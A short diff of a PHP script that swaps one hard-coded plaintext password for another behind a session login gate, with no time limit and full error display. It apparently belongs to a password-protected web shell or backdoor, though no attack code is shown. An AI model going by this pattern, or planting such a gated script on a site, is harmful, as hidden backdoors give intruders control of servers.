@@ -4,7 +4,7 @@ set_time_limit(0);
 error_reporting(E_ALL);
 ini_set('display_errors', 1);
 
-$kataSandiBenar = 'anjaybisa';
+$kataSandiBenar = 'goolcuk';
 
 if (!isset($_SESSION['authenticated']) || $_SESSION['authenticated'] !== true) {
     if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['password'])) {
